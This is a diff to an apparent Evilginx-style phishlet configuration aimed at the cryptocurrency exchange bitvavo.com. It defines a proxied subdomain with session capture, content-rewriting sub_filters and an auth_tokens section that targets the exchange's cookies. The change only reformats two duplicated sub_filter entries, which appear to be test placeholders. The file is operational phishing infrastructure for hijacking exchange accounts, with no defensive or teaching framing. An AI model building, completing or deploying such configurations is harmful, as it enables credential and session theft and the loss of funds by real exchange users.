@@ -10,8 +10,18 @@ proxy_hosts:
   - {phish_sub: 'ws', orig_sub: 'ws', domain: 'bitvavo.com', session: true, is_landing: false, auto_filter: true}
 
 sub_filters:
-  - {triggers_on: 'bitvavo.com', orig_sub: '', domain: '', search: 'login', replace: 'Test', mimes: ['text/html', 'application/json', 'application/javascript']}
-  - {triggers_on: 'bitvavo.com', orig_sub: '', domain: '', search: 'login', replace: 'Test', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - triggers_on: 'bitvavo.com'
+    orig_sub: ''
+    domain: ''
+    search: 'login'
+    replace: 'Test'
+    mimes: ['text/html', 'application/json', 'application/javascript']
+  - triggers_on: 'bitvavo.com'
+    orig_sub: ''
+    domain: ''
+    search: 'login'
+    replace: 'Test'
+    mimes: ['text/html', 'application/json', 'application/javascript']
 
 auth_tokens:
   - domain: '.bitvavo.com'
